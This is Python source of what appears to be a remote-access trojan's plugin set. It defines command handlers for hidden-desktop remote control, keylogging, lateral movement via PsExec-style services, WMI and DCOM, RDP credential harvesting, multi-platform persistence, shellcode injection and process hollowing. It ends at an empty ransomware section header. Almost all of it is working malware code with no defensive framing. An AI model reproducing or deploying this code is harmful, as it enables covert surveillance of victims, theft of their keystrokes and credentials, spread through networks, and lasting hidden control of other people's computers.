        if desk: u32.CloseDesktop(desk)
        _hvnc_desk = None; _hvnc_run[0] = False

def _cmd_hvnc_start(m):
    if _hvnc_run[0]: return {"output": "[!] HVNC already running"}
    import ctypes
    if not ctypes.windll.shell32.IsUserAnAdmin():
        return {"output": "[!] HVNC requires admin. Use uac_bypass command first to spawn an elevated agent, then use HVNC on that new client."}
    threading.Thread(target=_hvnc_thread, daemon=True).start()
    time.sleep(0.5)
    if _hvnc_desk: return {"output": f"[+] HVNC started on desktop '{_hvnc_name}'"}
    return {"output": "[!] HVNC failed - create thread failed"}

def _cmd_hvnc_stop(m):
    _hvnc_run[0] = False; return {"output": "[+] HVNC stopped"}

def _ss_gdi(desk_handle=None):
    try:
        import ctypes, struct
        u32 = ctypes.windll.user32; g32 = ctypes.windll.gdi32
        cur = u32.OpenInputDesktop(0, False, 0x0100)
        if desk_handle and not u32.SwitchDesktop(desk_handle):
            if cur: u32.CloseDesktop(cur)
            return None
        ctypes.windll.kernel32.Sleep(200)
        w, h = u32.GetSystemMetrics(0), u32.GetSystemMetrics(1)
        hdc_src = u32.GetDC(None)
        hdc_dst = g32.CreateCompatibleDC(hdc_src)
        hbmp = g32.CreateCompatibleBitmap(hdc_src, w, h)
        g32.SelectObject(hdc_dst, hbmp)
        g32.BitBlt(hdc_dst, 0, 0, w, h, hdc_src, 0, 0, 0x00CC0020)
        W = ctypes.wintypes
        class BIH(ctypes.Structure):
            _fields_ = [("s", W.DWORD), ("w", W.LONG), ("h", W.LONG),
                        ("p", W.WORD), ("b", W.WORD), ("c", W.DWORD),
                        ("s2", W.DWORD), ("x", W.LONG), ("y", W.LONG),
                        ("u", W.DWORD), ("v", W.DWORD)]
        bih = BIH(40, w, h, 1, 32, 0, 0, 0, 0, 0, 0)
        sz = w * h * 4; bits = (ctypes.c_byte * sz)()
        g32.GetDIBits(hdc_dst, hbmp, 0, h, bits, ctypes.byref(bih), 0)
        u32.ReleaseDC(None, hdc_src); g32.DeleteDC(hdc_dst); g32.DeleteObject(hbmp)
        hdr = struct.pack("<HIHHI", 0x4D42, 54 + sz, 0, 0, 54)
        if cur: u32.SwitchDesktop(cur); u32.CloseDesktop(cur)
        return hdr + ctypes.string_at(ctypes.byref(bih), 40) + bytes(bits)
    except: return None

def _cmd_hvnc_screenshot(m):
    try:
        if not _hvnc_desk: return {"output": "[!] HVNC not running"}
        bmp = _ss_gdi(_hvnc_desk)
        if bmp: return {"data": base64.b64encode(bmp).decode()}
        return {"output": "[!] HVNC screenshot failed"}
    except Exception as e: return {"output": f"[!] HVNC screenshot: {e}"}

def _cmd_hvnc_stream(m):
    try:
        if not _hvnc_desk: return {"output": "[!] HVNC not running"}
        count = min(m.get("count", 5), 20)
        delay = max(min(m.get("delay", 1), 5), 0.5)
        images = []
        for i in range(count):
            bmp = _ss_gdi(_hvnc_desk)
            if bmp: images.append(base64.b64encode(bmp).decode())
            time.sleep(delay)
        return {"data": images, "count": len(images)} if images else {"output": "[!] HVNC stream failed"}
    except Exception as e: return {"output": f"[!] HVNC stream: {e}"}

def _hvnc_send_input(input_type, flags, data, extra=0):
    try:
        import ctypes
        u32 = ctypes.windll.user32
        if not _hvnc_desk: return False
        cur = u32.OpenInputDesktop(0, False, 0x0100)
        if not u32.SwitchDesktop(_hvnc_desk):
            if cur: u32.CloseDesktop(cur)
            return False
        ctypes.windll.kernel32.Sleep(50)
        W = ctypes.wintypes
        class MOUSEI(ctypes.Structure):
            _fields_ = [("dx", W.LONG), ("dy", W.LONG), ("md", W.DWORD),
                        ("flags", W.DWORD), ("t", W.DWORD), ("ei", ctypes.POINTER(ctypes.c_ulong))]
        class KEYI(ctypes.Structure):
            _fields_ = [("vk", W.WORD), ("scan", W.WORD), ("flags", W.DWORD),
                        ("t", W.DWORD), ("ei", ctypes.POINTER(ctypes.c_ulong))]
        class _U(ctypes.Union):
            _fields_ = [("mi", MOUSEI), ("ki", KEYI), ("hi", ctypes.c_ulong * 3)]
        class INPUT(ctypes.Structure):
            _fields_ = [("type", W.DWORD), ("u", _U)]
        inp = INPUT()
        inp.type = input_type
        if input_type == 0:
            inp.u.mi = MOUSEI(data[0], data[1], extra, flags, 0, None)
        else:
            inp.u.ki = KEYI(data, extra, flags, 0, None)
        ret = u32.SendInput(1, ctypes.byref(inp), ctypes.sizeof(INPUT))
        if cur: u32.SwitchDesktop(cur); u32.CloseDesktop(cur)
        return ret == 1
    except: return False

def _cmd_hvnc_mouse(m):
    try:
        action = m.get("action", "move")
        x = int(m.get("x", 0)); y = int(m.get("y", 0))
        acts = {"move": 0x0001, "click": 0x0002|0x0004, "rightclick": 0x0008|0x0010,
                "doubleclick": 0x0002|0x0004}
        if action not in acts: return {"output": f"[!] Unknown: {action}"}
        ok = _hvnc_send_input(0, acts[action], (x, y))
        if action == "doubleclick":
            time.sleep(0.05)
            ok = _hvnc_send_input(0, acts[action], (x, y))
        return {"output": f"[+] Mouse {action} ({x},{y}): {'OK' if ok else 'FAIL'}"}
    except Exception as e: return {"output": f"[!] HVNC mouse: {e}"}

def _cmd_hvnc_key(m):
    try:
        action = m.get("action", "press")
        if action == "type":
            text = m.get("text", "")
            for c in text:
                vk = ord(c.upper())
                _hvnc_send_input(1, 0, vk)
                _hvnc_send_input(1, 2, vk)
            return {"output": f"[+] Typed '{text[:50]}'"}
        key = int(m.get("key", 0))
        _hvnc_send_input(1, 0, key)
        _hvnc_send_input(1, 2, key)
        return {"output": "+ Key press OK"}
    except Exception as e: return {"output": f"[!] HVNC key: {e}"}

_CMDS["hvnc_start"] = _cmd_hvnc_start
_CMDS["hvnc_stop"] = _cmd_hvnc_stop
_CMDS["hvnc_screenshot"] = _cmd_hvnc_screenshot
_CMDS["hvnc_stream"] = _cmd_hvnc_stream
_CMDS["hvnc_mouse"] = _cmd_hvnc_mouse
_CMDS["hvnc_key"] = _cmd_hvnc_key


# --- keylogger plugin ---

_kl_keys = []; _kl_run = [False]
def _kl_thread():
    _kl_run[0] = True
    if platform.system() == "Windows":
        from ctypes import windll
        while _kl_run[0]:
            for c in range(255):
                if windll.user32.GetAsyncKeyState(c) & 1: _kl_keys.append(c)
            time.sleep(0.01)
    elif platform.system() == "Linux":
        try:
            from pynput import keyboard
            def _kp(k):
                try: _kl_keys.append(k.char)
                except: _kl_keys.append(f"[{k}]")
            with keyboard.Listener(on_press=_kp) as l: l.join()
        except: pass
    _kl_run[0] = False

def _cmd_keylog_start(m):
    if not _kl_run[0]: threading.Thread(target=_kl_thread, daemon=True).start(); return {"output": "[+] Keylogger started"}
    return {"output": "[!] Already running"}

def _cmd_keylog_stop(m):
    _kl_run[0] = False; return {"output": "[+] Keylogger stopped"}

def _cmd_keylog_get(m):
    o = "".join(str(c) if isinstance(c, int) else c for c in _kl_keys); _kl_keys.clear()
    return {"output": o or "(no keys captured)"}
_CMDS["keylog_start"] = _cmd_keylog_start; _CMDS["keylog_stop"] = _cmd_keylog_stop; _CMDS["keylog_get"] = _cmd_keylog_get


# --- lateral plugin ---

def _cmd_psexec(m):
    if platform.system() != "Windows": return {"output": "[!] PsExec requires Windows"}
    t = m.get("target",""); c = m.get("cmd",""); u = m.get("user",""); p = m.get("pass","")
    if not t or not c: return {"output": "Usage: target=<host> cmd=<command> [user=<user> pass=<pass>]"}
    import subprocess, tempfile, os, base64
    r = []
    try:
        if u and p:
            subprocess.run(f'net use \\\\{t}\\ADMIN$ {p} /user:{u}', shell=True, capture_output=True, timeout=10)
            r.append("auth")
        tmp = "%TEMP%\\whisper_psexec.exe"
        if m.get("upload"):
            with tempfile.NamedTemporaryFile(delete=False, suffix=".exe") as f:
                f.write(base64.b64decode(m["upload"]))
                local = f.name
            subprocess.run(f'copy "{local}" \\\\{t}\\ADMIN${tmp}', shell=True, capture_output=True, timeout=15)
            os.remove(local)
            r.append("copied")
        subprocess.run(f'sc \\\\{t} create Whisper_PSEXEC binPath= "{tmp}" start= demand', shell=True, capture_output=True, timeout=10)
        subprocess.run(f'sc \\\\{t} start Whisper_PSEXEC', shell=True, capture_output=True, timeout=15)
        subprocess.run(f'sc \\\\{t} delete Whisper_PSEXEC', shell=True, capture_output=True, timeout=10)
        out = subprocess.run(f'wmic /node:{t} process call create "cmd /c {c} > %TEMP%\\whisper_out.txt 2>&1"', shell=True, capture_output=True, timeout=30, text=True)
        r.append("done")
    except Exception as e: r.append(f"error: {e}")
    return {"output": f"[+] PsExec: {', '.join(r)}"}

def _cmd_wmiexec(m):
    if platform.system() != "Windows": return {"output": "[!] WMI exec requires Windows"}
    t = m.get("target",""); c = m.get("cmd",""); u = m.get("user",""); p = m.get("pass","")
    if not t or not c: return {"output": "Usage: target=<host> cmd=<command> [user=<user> pass=<pass>]"}
    import subprocess
    try:
        a = ["wmic", "/node:" + t]
        if u and p: a += ["/user:" + u, "/password:" + p]
        a += ["process", "call", "create", f"cmd /c {c}"]
        r = subprocess.run(a, capture_output=True, text=True, timeout=30)
        out = r.stdout + r.stderr
        return {"output": f"[+] WMI exec result:\n{out[:2000]}"}
    except Exception as e: return {"output": f"[!] WMI exec failed: {e}"}

def _cmd_dcomexec(m):
    if platform.system() != "Windows": return {"output": "[!] DCOM exec requires Windows"}
    t = m.get("target",""); c = m.get("cmd",""); u = m.get("user",""); p = m.get("pass","")
    if not t or not c: return {"output": "Usage: target=<host> cmd=<command> [user=<user> pass=<pass>]"}
    import subprocess
    try:
        ps_cmd = f'''$c = [Activator]::CreateInstance([Type]::GetTypeFromProgID("MMC20.Application","{t}")); $c.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c {c}","7")'''
        args = ["powershell", "-NoP", "-NonI", "-W", "Hidden", "-Enc"]
        args.append(base64.b64encode(ps_cmd.encode("utf-16-le")).decode())
        if u and p:
            sec = f'-Credential (New-Object System.Management.Automation.PSCredential("{u}",(ConvertTo-SecureString "{p}" -AsPlainText -Force)))'
            args.insert(1, sec)
        r = subprocess.run(args, capture_output=True, text=True, timeout=30)
        return {"output": f"[+] DCOM exec sent: {r.stdout[:500]}"}
    except Exception as e: return {"output": f"[!] DCOM exec failed: {e}"}

def _cmd_rdp_harvest(m):
    if platform.system() != "Windows": return {"output": "[!] RDP harvest requires Windows"}
    import subprocess, os
    r = []
    try:
        out = subprocess.run(["qwinsta"], capture_output=True, text=True, timeout=10)
        r.append(f"Sessions:\n{out.stdout[:1000]}")
    except: pass
    for p in [os.path.expanduser("~/AppData/Local/Microsoft/Credentials"),
              os.path.expanduser("~/AppData/Roaming/Microsoft/Credentials")]:
        if os.path.isdir(p):
            r.append(f"Cred files: {len(os.listdir(p))} in {p}")
            for f in os.listdir(p)[:5]:
                r.append(f"  {f}")
    try:
        out = subprocess.run(["cmdkey", "/list"], capture_output=True, text=True, timeout=10)
        r.append(f"Stored creds:\n{out.stdout[:1000]}")
    except: pass
    try:
        out = subprocess.run(["reg", "query", "HKCU\\Software\\Microsoft\\Terminal Server Client\\Servers"],
                            capture_output=True, text=True, timeout=10)
        r.append(f"RDP servers:\n{out.stdout[:500]}")
    except: pass
    return {"output": "\n".join(r)}
_CMDS["psexec"] = _cmd_psexec; _CMDS["wmiexec"] = _cmd_wmiexec; _CMDS["dcomexec"] = _cmd_dcomexec; _CMDS["rdp_harvest"] = _cmd_rdp_harvest


# --- persistence plugin ---

def _cmd_persist(m):
    try:
        if platform.system() == "Windows":
            sp = os.path.abspath(sys.argv[0]); r = []
            action = m.get("action", "install")
            import winreg
            name = m.get("name", "Whisper")

            if action == "install":
                # Registry Run keys
                for hive, key in [(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                                  (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run")]:
                    try:
                        with winreg.OpenKey(hive, key, 0, winreg.KEY_SET_VALUE) as k:
                            winreg.SetValueEx(k, name, 0, winreg.REG_SZ, sp)
                        r.append("HKLM" if hive == winreg.HKEY_LOCAL_MACHINE else "HKCU")
                    except: pass
                # Startup Folder
                sf = os.path.join(os.environ.get("APPDATA",""), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
                try:
                    os.makedirs(sf, exist_ok=True)
                    with open(os.path.join(sf, f"{name}.bat"), "w") as f:
                        f.write(f'@start "" "{sp}"')
                    r.append("Startup")
                except: pass
                # WMI
                try:
                    subprocess.run(f'wmic startup call create "{sp}", "{name}"', shell=True, capture_output=True, timeout=10)
                    r.append("WMI")
                except: pass
                # Scheduled Task (run on logon)
                try:
                    subprocess.run(f'schtasks /create /tn "{name}" /tr "{sp}" /sc onlogon /ru "%%USERNAME%%" /f', shell=True, capture_output=True, timeout=15)
                    r.append("SchedTask")
                except: pass
                # Windows Service (via sc)
                try:
                    svc_name = f"{name}Svc"
                    subprocess.run(f'sc create "{svc_name}" binPath= "{sp}" start= auto', shell=True, capture_output=True, timeout=10)
                    subprocess.run(f'sc description "{svc_name}" "Service"', shell=True, capture_output=True, timeout=10)
                    r.append("Service")
                except: pass
                return {"output": f"[+] Persistence: {', '.join(r) if r else 'failed'}"}

            else:  # remove
                # Registry
                for hive, key in [(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                                  (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run")]:
                    try:
                        with winreg.OpenKey(hive, key, 0, winreg.KEY_SET_VALUE) as k:
                            winreg.DeleteValue(k, name)
                        r.append(f"Removed HKLM" if hive == winreg.HKEY_LOCAL_MACHINE else "Removed HKCU")
                    except: pass
                # Startup
                try:
                    os.remove(os.path.join(os.environ.get("APPDATA",""), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", f"{name}.bat"))
                    r.append("Removed Startup")
                except: pass
                # Scheduled Task
                try:
                    subprocess.run(f'schtasks /delete /tn "{name}" /f', shell=True, capture_output=True, timeout=10)
                    r.append("Removed SchedTask")
                except: pass
                # Service
                try:
                    subprocess.run(f'sc delete "{name}Svc"', shell=True, capture_output=True, timeout=10)
                    r.append("Removed Service")
                except: pass
                return {"output": f"[+] Persistence removed: {', '.join(r) if r else 'nothing found'}"}

        elif platform.system() == "Linux":
            h = os.path.expanduser("~"); r = []
            sp = os.path.abspath(sys.argv[0])
            action = m.get("action", "install")
            if action == "install":
                for d in [os.path.join(h,".config","autostart")]:
                    os.makedirs(d, exist_ok=True)
                    with open(os.path.join(d,"whisper.desktop"),"w") as f:
                        f.write(f"[Desktop Entry]\nType=Application\nName=Whisper\nExec=python3 {sp}\n")
                    r.append("autostart")
                try:
                    subprocess.run(f'(crontab -l 2>/dev/null; echo "@reboot python3 {sp}") | crontab -', shell=True, timeout=10)
                    r.append("crontab")
                except: pass
            else:
                for d in [os.path.join(h,".config","autostart")]:
                    try:
                        os.remove(os.path.join(d,"whisper.desktop"))
                        r.append("Removed autostart")
                    except: pass
                try:
                    out = subprocess.check_output(["crontab","-l"], timeout=5).decode()
                    new = "\n".join(l for l in out.split("\n") if sp not in l)
                    subprocess.run(f"crontab -", input=new, shell=True, timeout=5)
                    r.append("Removed crontab")
                except: pass
            return {"output": f"[+] Persistence: {', '.join(r)}"}

        elif platform.system() == "Darwin":
            h = os.path.expanduser("~"); pl = os.path.join(h, "Library", "LaunchAgents", "com.whisper.plist")
            action = m.get("action", "install")
            if action == "install":
                os.makedirs(os.path.dirname(pl), exist_ok=True)
                with open(pl,"w") as f:
                    f.write('<?xml version="1.0"?><!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"><plist version="1.0"><dict><key>Label</key><string>com.whisper</string><key>ProgramArguments</key><array><string>/usr/bin/python3</string><string>'+os.path.abspath(sys.argv[0])+'</string></array><key>RunAtLoad</key><true/></dict></plist>')
                subprocess.run(["launchctl","load",pl], capture_output=True)
                return {"output": "[+] Persistence: LaunchAgent"}
            else:
                subprocess.run(["launchctl","unload",pl], capture_output=True)
                try: os.remove(pl)
                except: pass
                return {"output": "[+] Persistence: LaunchAgent removed"}
    except Exception as e: return {"output": f"[!] Persistence failed: {e}"}

def _cmd_persist_check(m):
    try:
        r = []
        if platform.system() == "Windows":
            import winreg
            for hive, key in [(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                              (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run")]:
                try:
                    with winreg.OpenKey(hive, key, 0, winreg.KEY_READ) as k:
                        val, _ = winreg.QueryValueEx(k, "Whisper")
                        r.append(f"Registry ({'HKLM' if hive == winreg.HKEY_LOCAL_MACHINE else 'HKCU'}): {val}")
                except: pass
            import subprocess
            try:
                out = subprocess.check_output(f'schtasks /query /tn "Whisper" /fo LIST', shell=True, timeout=10, creationflags=0x08000000, stderr=subprocess.DEVNULL).decode(errors="replace")
                r.append("Scheduled Task: " + out.split("\n")[0][:80])
            except: pass
            return {"output": "\n".join(r) if r else "[!] No persistence found"}
        return {"output": "[!] Check not supported on this OS"}
    except Exception as e: return {"output": f"[!] Persist check error: {e}"}

_CMDS["persist"] = _cmd_persist
_CMDS["persist_check"] = _cmd_persist_check


# --- process_inject plugin ---

import ctypes, os, subprocess, struct

PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_READWRITE = 0x04
PAGE_EXECUTE_READWRITE = 0x40
CREATE_SUSPENDED = 0x00000004

kernel32 = ctypes.windll.kernel32
ntdll = ctypes.windll.ntdll

def _find_pid(name):
    try:
        out = subprocess.check_output(["tasklist", "/FI", f"IMAGENAME eq {name}", "/FO", "CSV"], timeout=10, creationflags=0x08000000).decode(errors="replace")
        for line in out.split("\n"):
            if name.lower() in line.lower() and "," in line:
                parts = [p.strip('" ') for p in line.split(",")]
                if len(parts) >= 2:
                    try: return int(parts[1])
                    except: pass
    except: pass
    return None

def _inject_shellcode(pid, shellcode):
    try:
        if not shellcode: return False, "No shellcode provided"
        proc = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
        if not proc: return False, f"OpenProcess failed ({ctypes.get_last_error()})"

        addr = kernel32.VirtualAllocEx(proc, None, len(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
        if not addr: kernel32.CloseHandle(proc); return False, "VirtualAllocEx failed"

        written = ctypes.c_size_t()
        ok = kernel32.WriteProcessMemory(proc, addr, shellcode, len(shellcode), ctypes.byref(written))
        if not ok or written.value != len(shellcode):
            kernel32.VirtualFreeEx(proc, addr, 0, 0x8000)
            kernel32.CloseHandle(proc)
            return False, "WriteProcessMemory failed"

        old = ctypes.c_uint32()
        kernel32.VirtualProtectEx(proc, addr, len(shellcode), PAGE_EXECUTE_READWRITE, ctypes.byref(old))

        thread = kernel32.CreateRemoteThread(proc, None, 0, addr, None, 0, None)
        if not thread:
            kernel32.VirtualFreeEx(proc, addr, 0, 0x8000)
            kernel32.CloseHandle(proc)
            return False, "CreateRemoteThread failed"

        kernel32.CloseHandle(thread)
        kernel32.CloseHandle(proc)
        return True, f"Injected into PID {pid}"
    except Exception as e: return False, str(e)

def _process_hollow(target_exe, payload_path):
    try:
        with open(payload_path, "rb") as f:
            payload = f.read()
        if len(payload) < 0x400: return False, "Payload too small"

        dos_hdr = payload[:64]
        if dos_hdr[:2] != b"MZ": return False, "Invalid PE"
        pe_off = struct.unpack("<I", dos_hdr[60:64])[0]
        if pe_off + 4 > len(payload) or payload[pe_off:pe_off+4] != b"PE\x00\x00":
            return False, "Invalid PE signature"

        file_hdr = payload[pe_off+4:pe_off+24]
        opt_hdr = payload[pe_off+24:]
        magic = struct.unpack("<H", opt_hdr[:2])[0]
        is_32 = magic == 0x10b
        is_64 = magic == 0x20b
        if not is_32 and not is_64: return False, "Unrecognized PE magic"

        if is_32:
            image_base = struct.unpack("<I", opt_hdr[28:32])[0]
            entry_point = struct.unpack("<I", opt_hdr[16:20])[0]
            size_of_image = struct.unpack("<I", opt_hdr[56:60])[0]
            size_of_headers = struct.unpack("<I", opt_hdr[60:64])[0]
            opt_hdr_size = 240
        else:
            image_base = struct.unpack("<Q", opt_hdr[24:32])[0]
            entry_point = struct.unpack("<I", opt_hdr[16:20])[0]
            size_of_image = struct.unpack("<I", opt_hdr[56:60])[0]
            size_of_headers = struct.unpack("<I", opt_hdr[60:64])[0]
            opt_hdr_size = 264

        num_sections = struct.unpack("<H", file_hdr[2:4])[0]
        sec_offset = pe_off + 24 + opt_hdr_size

        sections = []
        for i in range(num_sections):
            raw = payload[sec_offset + i*40:sec_offset + (i+1)*40]
            if len(raw) < 40: break
            name = raw[:8].rstrip(b"\x00").decode(errors="replace")
            sections.append({
                "name": name,
                "rva": struct.unpack("<I", raw[12:16])[0],
                "rsize": struct.unpack("<I", raw[16:20])[0],
                "roffset": struct.unpack("<I", raw[20:24])[0],
            })

        reloc_rva, reloc_size = 0, 0
        for s in sections:
            if s["name"] == ".reloc":
                reloc_rva, reloc_size = s["rva"], s["rsize"]
                break

        si = ctypes.c_ulonglong * 12
        pinfo = (ctypes.c_ulonglong * 4)()
        sinfo = si()
        ret = kernel32.CreateProcessW(target_exe, None, None, None, False, CREATE_SUSPENDED, None, None,
                                      ctypes.byref(sinfo), ctypes.byref(pinfo))
        if not ret: return False, "CreateProcess (suspended) failed"

        proc_h = pinfo[0]
        thread_h = pinfo[1]
        pid = pinfo[2]

        if is_32:
            CONTEXT_FULL = 0x10007
            class Ctx32(ctypes.Structure):
                _fields_ = [
                    ("ContextFlags", ctypes.c_ulong),
                    ("Dr0", ctypes.c_ulong), ("Dr1", ctypes.c_ulong), ("Dr2", ctypes.c_ulong),
                    ("Dr3", ctypes.c_ulong), ("Dr6", ctypes.c_ulong), ("Dr7", ctypes.c_ulong),
                    ("FloatSave", ctypes.c_byte * 152),
                    ("SegGs", ctypes.c_ulong), ("SegFs", ctypes.c_ulong), ("SegEs", ctypes.c_ulong),
                    ("SegDs", ctypes.c_ulong),
                    ("Edi", ctypes.c_ulong), ("Esi", ctypes.c_ulong), ("Ebx", ctypes.c_ulong),
                    ("Edx", ctypes.c_ulong), ("Ecx", ctypes.c_ulong), ("Eax", ctypes.c_ulong),
                    ("Ebp", ctypes.c_ulong), ("Eip", ctypes.c_ulong), ("SegCs", ctypes.c_ulong),
                    ("EFlags", ctypes.c_ulong), ("Esp", ctypes.c_ulong), ("SegSs", ctypes.c_ulong),
                    ("ExtendedRegisters", ctypes.c_byte * 512),
                ]
            ctx = Ctx32()
            ctx.ContextFlags = CONTEXT_FULL
            if not kernel32.GetThreadContext(thread_h, ctypes.byref(ctx)):
                kernel32.CloseHandle(thread_h); kernel32.CloseHandle(proc_h)
                return False, "GetThreadContext failed"
            peb_addr = ctx.Ebx
        else:
            class Ctx64(ctypes.Structure):
                _fields_ = [
                    ("P1Home", ctypes.c_ulonglong), ("P2Home", ctypes.c_ulonglong),
                    ("P3Home", ctypes.c_ulonglong), ("P4Home", ctypes.c_ulonglong),
                    ("P5Home", ctypes.c_ulonglong), ("P6Home", ctypes.c_ulonglong),
                    ("ContextFlags", ctypes.c_ulong), ("MxCsr", ctypes.c_ulong),
                    ("SegCs", ctypes.c_ushort), ("SegDs", ctypes.c_ushort),
                    ("SegEs", ctypes.c_ushort), ("SegFs", ctypes.c_ushort),
                    ("SegGs", ctypes.c_ushort), ("SegSs", ctypes.c_ushort),
                    ("EFlags", ctypes.c_ulong),
                    ("Dr0", ctypes.c_ulonglong), ("Dr1", ctypes.c_ulonglong),
                    ("Dr2", ctypes.c_ulonglong), ("Dr3", ctypes.c_ulonglong),
                    ("Dr6", ctypes.c_ulonglong), ("Dr7", ctypes.c_ulonglong),
                    ("Rax", ctypes.c_ulonglong), ("Rcx", ctypes.c_ulonglong),
                    ("Rdx", ctypes.c_ulonglong), ("Rbx", ctypes.c_ulonglong),
                    ("Rsp", ctypes.c_ulonglong), ("Rbp", ctypes.c_ulonglong),
                    ("Rsi", ctypes.c_ulonglong), ("Rdi", ctypes.c_ulonglong),
                    ("R8", ctypes.c_ulonglong), ("R9", ctypes.c_ulonglong),
                    ("R10", ctypes.c_ulonglong), ("R11", ctypes.c_ulonglong),
                    ("R12", ctypes.c_ulonglong), ("R13", ctypes.c_ulonglong),
                    ("R14", ctypes.c_ulonglong), ("R15", ctypes.c_ulonglong),
                    ("Rip", ctypes.c_ulonglong),
                ]
            ctx64 = Ctx64()
            ctx64.ContextFlags = 0x100000
            if not kernel32.GetThreadContext(thread_h, ctypes.byref(ctx64)):
                kernel32.CloseHandle(thread_h); kernel32.CloseHandle(proc_h)
                return False, "GetThreadContext failed"
            peb_addr = ctx64.Rdx  # RDX points to PEB on x64

        # Read image base from PEB (offset 8)
        img_base = ctypes.c_ulonglong() if is_64 else ctypes.c_ulong()
        read = ctypes.c_size_t()
        kernel32.ReadProcessMemory(proc_h, peb_addr + 8, ctypes.byref(img_base), ctypes.sizeof(img_base), ctypes.byref(read))

        ntdll.NtUnmapViewOfSection(proc_h, img_base)

        alloc_addr = kernel32.VirtualAllocEx(proc_h, None if is_64 else img_base, size_of_image, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
        if not alloc_addr:
            alloc_addr = kernel32.VirtualAllocEx(proc_h, None, size_of_image, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)

        if not alloc_addr:
            kernel32.CloseHandle(thread_h); kernel32.CloseHandle(proc_h)
            return False, "VirtualAllocEx failed"

        kernel32.WriteProcessMemory(proc_h, alloc_addr, payload[:size_of_headers], size_of_headers, ctypes.byref(read))

        for s in sections:
            if s["rsize"] and s["roffset"]:
                sec_data = payload[s["roffset"]:s["roffset"]+s["rsize"]]
                if sec_data:
                    kernel32.WriteProcessMemory(proc_h, alloc_addr + s["rva"], sec_data, len(sec_data), ctypes.byref(read))

        delta = alloc_addr - (img_base.value if is_64 else img_base.value & 0xFFFFFFFF)
        if delta and reloc_rva:
            for s in sections:
                if s["roffset"] and s["rsize"] and (s["rva"] <= reloc_rva < s["rva"] + s["rsize"]):
                    reloc_data = payload[s["roffset"] + (reloc_rva - s["rva"]):s["roffset"] + (reloc_rva - s["rva"]) + reloc_size]
                    pos = 0
                    while pos + 8 <= len(reloc_data):
                        page_rva = struct.unpack("<I", reloc_data[pos:pos+4])[0]
                        block_size = struct.unpack("<I", reloc_data[pos+4:pos+8])[0]
                        if block_size == 0: break
                        entries = (block_size - 8) // 2
                        for e in range(entries):
                            off = pos + 8 + e * 2
                            if off + 2 > len(reloc_data): break
                            entry = struct.unpack("<H", reloc_data[off:off+2])[0]
                            entry_type = entry >> 12
                            entry_off = entry & 0xFFF
                            if entry_type == 3 and is_32:
                                addr = alloc_addr + page_rva + entry_off
                                val = ctypes.c_uint32()
                                kernel32.ReadProcessMemory(proc_h, addr, ctypes.byref(val), 4, ctypes.byref(read))
                                val = ctypes.c_uint32(val.value + (delta & 0xFFFFFFFF))
                                kernel32.WriteProcessMemory(proc_h, addr, ctypes.byref(val), 4, ctypes.byref(read))
                            elif entry_type == 0xA and is_64:
                                addr = alloc_addr + page_rva + entry_off
                                val = ctypes.c_ulonglong()
                                kernel32.ReadProcessMemory(proc_h, addr, ctypes.byref(val), 8, ctypes.byref(read))
                                val = ctypes.c_ulonglong(val.value + delta)
                                kernel32.WriteProcessMemory(proc_h, addr, ctypes.byref(val), 8, ctypes.byref(read))
                        pos += block_size
                    break

        if is_32:
            ctx.Eax = alloc_addr + entry_point
            kernel32.SetThreadContext(thread_h, ctypes.byref(ctx))
        else:
            ctx64.Rcx = alloc_addr + entry_point
            kernel32.SetThreadContext(thread_h, ctypes.byref(ctx64))

        kernel32.ResumeThread(thread_h)
        kernel32.CloseHandle(thread_h)
        kernel32.CloseHandle(proc_h)
        return True, f"Hollowed {os.path.basename(target_exe)} (PID {pid}) -> {os.path.basename(payload_path)}"
    except Exception as e:
        return False, str(e)

def _cmd_inject_shellcode(m):
    try:
        if platform.system() != "Windows": return {"output": "[!] Injection requires Windows"}
        target = m.get("target", "explorer.exe")
        pid = m.get("pid", None)
        if pid is None:
            pid = _find_pid(target)
            if pid is None: return {"output": f"[!] Process '{target}' not found"}
        shellcode_b64 = m.get("shellcode", "")
        if not shellcode_b64: return {"output": "[!] No shellcode provided (base64)"}
        import base64
        shellcode = base64.b64decode(shellcode_b64)
        ok, msg = _inject_shellcode(pid, shellcode)
        return {"output": f"[+] Shellcode injection: {msg}" if ok else f"[!] {msg}"}
    except Exception as e: return {"output": f"[!] Inject error: {e}"}

def _cmd_process_hollow(m):
    try:
        if platform.system() != "Windows": return {"output": "[!] Process hollowing requires Windows"}
        target = m.get("target", "C:\\Windows\\System32\\rundll32.exe")
        payload_path = m.get("payload", "")
        if not payload_path or not os.path.isfile(payload_path):
            return {"output": "[!] Provide valid payload path"}
        ok, msg = _process_hollow(target, payload_path)
        return {"output": f"[+] Process hollowing: {msg}" if ok else f"[!] {msg}"}
    except Exception as e: return {"output": f"[!] Hollow error: {e}"}

def _cmd_list_processes(m):
    try:
        if platform.system() != "Windows": return {"output": "[!] Process listing requires Windows"}
        out = subprocess.check_output(["tasklist", "/FO", "CSV", "/NH"], timeout=10, creationflags=0x08000000).decode(errors="replace")
        lines = []
        for line in out.split("\n"):
            if line.strip():
                parts = [p.strip('" ') for p in line.split(",")]
                if len(parts) >= 2:
                    lines.append(f"  {parts[1]:>6s}  {parts[0][:30]}")
                    if len(lines) >= 50: break
        return {"output": "[+] Processes (PID, Name):\n" + "\n".join(lines)}
    except Exception as e: return {"output": f"[!] Process list error: {e}"}

_CMDS["inject_shellcode"] = _cmd_inject_shellcode
_CMDS["process_hollow"] = _cmd_process_hollow
_CMDS["list_processes"] = _cmd_list_processes


# --- ransomware plugin ---

